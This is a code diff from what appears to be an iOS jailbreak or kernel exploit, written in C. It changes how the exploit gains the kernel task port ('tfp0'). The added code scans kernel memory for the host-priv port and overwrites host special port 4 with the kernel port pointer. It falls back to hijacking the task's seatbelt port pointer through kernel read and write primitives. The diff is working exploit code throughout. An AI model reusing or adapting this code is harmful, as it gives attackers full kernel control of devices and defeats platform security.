@@ -83,6 +83,30 @@ int remap_kernel_task(uint32_t entry_pa) {
     return 0;
 }
 
+int find_host_port(void) {
+    uint32_t page_va = kinfo->kern_port_addr & ~0xfff;
+    uint32_t page_pa = kvtophys(page_va);
+    if (page_va == 0) return -1;
+
+    uint8_t *mapped = map_data(page_pa, 0x1000, VM_PROT_READ);
+    uint32_t task_bits = IO_BITS_ACTIVE | IKOT_HOST_PRIV;
+     
+    for (uint32_t i = 0; i < 0x1000; i+=0x4) {
+        if (*(uint32_t *)(mapped + i) == task_bits) {
+            if (kinfo->version[0] >= 4) {
+                unmap_data(mapped, 0x1000);
+                return page_va + i;
+            } else {
+                unmap_data(mapped, 0x1000);
+                return page_va + i - 0x4;
+            }
+        }
+    }
+
+    unmap_data(mapped, 0x1000);
+    return 0;
+}
+
 int run_oob_entry(bool enable_tfp0) {
     uint64_t timer = timer_start();
     kinfo = calloc(1, sizeof(kinfo_t));
@@ -231,32 +255,44 @@ int run_oob_entry(bool enable_tfp0) {
             if (remap_kernel_task(kinfo->mapping_base + 0x40000) != 0) goto done;
         }
 
-        uint32_t seatbelt_page = kvtophys((kinfo->self_task_addr + koffsetof(task, itk_seatbelt)) & ~0xfff);
-        uint32_t seatbelt_offset = (kinfo->self_task_addr + koffsetof(task, itk_seatbelt)) & 0xfff;
-        uint8_t *mapped_page = map_data(seatbelt_page, 0x1000, VM_PROT_READ|VM_PROT_WRITE);
+        if (getuid() == 0) {
+            uint32_t host_priv_addr = find_host_port();
+            uint32_t realhost = kread32(host_priv_addr + koffsetof(ipc_port, ip_kobject));
+            uint32_t hsp4_offset = 0x8 + (4 * sizeof(void *));
 
-        volatile uint32_t *seatbelt_ptr = (volatile uint32_t *)(mapped_page + seatbelt_offset);
-        uint32_t seatbelt_addr = *seatbelt_ptr;
-        mach_port_t task = mach_task_self();
-
-        *seatbelt_ptr = kinfo->kern_port_addr;
-        usleep(250000);
-        sync();
-
-        while (1) {
-            task_get_special_port(task, TASK_SEATBELT_PORT, &kinfo->tfp0);
-            if (MACH_PORT_VALID(kinfo->tfp0)) break;
-
-            *seatbelt_ptr = kinfo->kern_port_addr;
-            usleep(50000);
+            kwrite32(realhost + hsp4_offset, kinfo->kern_port_addr);
+            usleep(100000);
             sync();
+            
+            for (uint32_t i = 0; i < 25; i++) {
+                host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kinfo->tfp0);
+                if (MACH_PORT_VALID(kinfo->tfp0)) break;
+
+                kwrite32(realhost + hsp4_offset, kinfo->kern_port_addr);
+                usleep(1000);
+            }
+            kwrite32(realhost + hsp4_offset, 0);
         }
 
-        unmap_data(mapped_page, 0x1000);
-        kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), seatbelt_addr);
-        print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
+        if (!MACH_PORT_VALID(kinfo->tfp0)) {
+            uint32_t seatbelt_addr = kread32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt));
+            kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), kinfo->kern_port_addr);
+            usleep(100000);
+            sync();
 
+            while (1) {
+                task_get_special_port(mach_task_self(), TASK_SEATBELT_PORT, &kinfo->tfp0);
+                if (MACH_PORT_VALID(kinfo->tfp0)) break;
+
+                kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), kinfo->kern_port_addr);
+                usleep(1000);
+            }
+            kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), seatbelt_addr);
+        }
+    
+        print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
         uint32_t test_alloc = kalloc(0x1000);
+
         print_log("[*] test_alloc: 0x%x\n", test_alloc);
         if (test_alloc == 0) goto done;
         
